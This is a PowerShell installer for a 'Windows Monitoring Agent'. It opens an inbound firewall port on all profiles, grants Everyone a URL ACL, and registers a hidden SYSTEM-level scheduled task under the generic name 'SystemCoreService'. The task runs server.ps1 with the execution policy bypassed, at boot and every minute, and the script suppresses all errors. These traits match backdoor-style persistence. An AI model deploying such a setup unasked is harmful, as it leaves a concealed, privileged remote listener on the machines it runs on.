# Windows Monitoring Agent Installer
param(
    [int]$Port = 9323,
    [string]$ApiKey = "",
    [string]$SecretKey = ""
)

$ErrorActionPreference = 'SilentlyContinue'

$CurrentDir = Split-Path -Parent $MyInvocation.MyCommand.Definition

# 1. Lock down permissions: only SYSTEM and local Administrators can access
try {
    $parentDir = Split-Path -Parent $CurrentDir
    if ($parentDir) {
        icacls $parentDir /inheritance:r /grant:r "SYSTEM:(OI)(CI)F" "Administrators:(OI)(CI)F" | Out-Null
    }
    icacls $CurrentDir /inheritance:r /grant:r "SYSTEM:(OI)(CI)F" "Administrators:(OI)(CI)F" | Out-Null
} catch {}

# 2. Allow URL ACL for port
netsh http add urlacl url="http://+:$Port/" sddl="D:(A;;GX;;;WD)" 2>$null

# 3. Add Firewall Rule
Remove-NetFirewallRule -DisplayName "SystemCoreService" -ErrorAction SilentlyContinue
New-NetFirewallRule -DisplayName "SystemCoreService" -Direction Inbound -LocalPort $Port -Protocol TCP -Action Allow -Profile Any -ErrorAction SilentlyContinue | Out-Null

# 4. Create Scheduled Task to run as SYSTEM at startup
$ArgList = "-ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -File `"$CurrentDir\server.ps1`" -Port $Port"
if ($ApiKey) {
    $ArgList += " -ApiKey `"$ApiKey`""
}
if ($SecretKey) {
    $ArgList += " -SecretKey `"$SecretKey`""
}

$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument $ArgList
$TriggerStartup = New-ScheduledTaskTrigger -AtStartup
$TriggerRepeat = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 1) -RepetitionDuration (New-TimeSpan -Days 3650)
$Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -ExecutionTimeLimit (New-TimeSpan) -MultipleInstances IgnoreNew -RestartCount 10 -RestartInterval (New-TimeSpan -Minutes 1)

Unregister-ScheduledTask -TaskName "SystemCoreService" -Confirm:$false -ErrorAction SilentlyContinue
Register-ScheduledTask -TaskName "SystemCoreService" -Action $Action -Trigger @($TriggerStartup, $TriggerRepeat) -Principal $Principal -Settings $Settings -Force | Out-Null

# 5. Start Task immediately
Start-ScheduledTask -TaskName "SystemCoreService" -ErrorAction SilentlyContinue

Write-Host "[+] System Service installed and running on port $Port"
